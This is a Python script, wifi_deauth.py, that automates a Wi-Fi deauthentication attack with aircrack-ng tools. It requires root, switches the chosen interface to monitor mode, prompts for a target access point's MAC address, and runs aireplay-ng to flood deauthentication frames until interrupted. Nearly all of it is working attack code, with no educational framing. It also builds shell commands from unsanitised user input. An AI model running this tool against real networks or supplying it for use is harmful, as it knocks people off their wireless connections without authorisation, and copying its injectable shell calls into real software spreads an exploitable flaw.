#!/bin/python3
import os
import subprocess
import time
import sys

if os.environ.get('USER') == 'root':
   pass
else:
   print('\n [!] You Must Run As Root...\n')
   exit(0)


# clear term
os.system('clear')

# wifi deauth ( main ) ...
if len(sys.argv) == 3:
   pass
else:
   print('\n [+] Help: ./wifi_deauth.py -i <interface> \n')
   exit(1)

# validate interface
if sys.argv[1] != '-i':
   print('\n [!] Switch <-i> Not Found: Specify An Interface ( -i <interface> )\n')
   exit(1)

if sys.argv[1] == '-i':
   interface = str(sys.argv[2])
   chk = subprocess.check_output(['ifconfig'], shell=True).decode().split()
   if interface+':' not in  chk:
      print('\n [!] {} : Interface not found !!! \n'.format(interface))
      exit(0)

interface = str(sys.argv[2])

# start monitor mode
print(f'\n [+] Putting {interface} To Monitor Mode... OK\n')
subprocess.check_output('airmon-ng start {}'.format(interface), shell=True)

print(f'\n [!] Run Command: < sudo airodump-ng {interface}mon > To Scan For Target... ( Target must be an access point !!! ) \n')
AP_mac_addr = input('\n [+] Target Mac Address: ')

if AP_mac_addr == '':
   print('\n [!] Mac Address Not Found...\n')
   print('\n [+] Ending Monitor Mode...')
   subprocess.run(f'sudo airmon-ng stop {interface}mon', shell=True)
   exit(0)

print()

os.system('clear')

try:
    subprocess.run(f'sudo aireplay-ng -0 0 -a {AP_mac_addr} {interface}mon', shell=True)
except KeyboardInterrupt:
    subprocess.run(f'sudo airmon-ng stop {interface}', shell=True)
    exit(0)
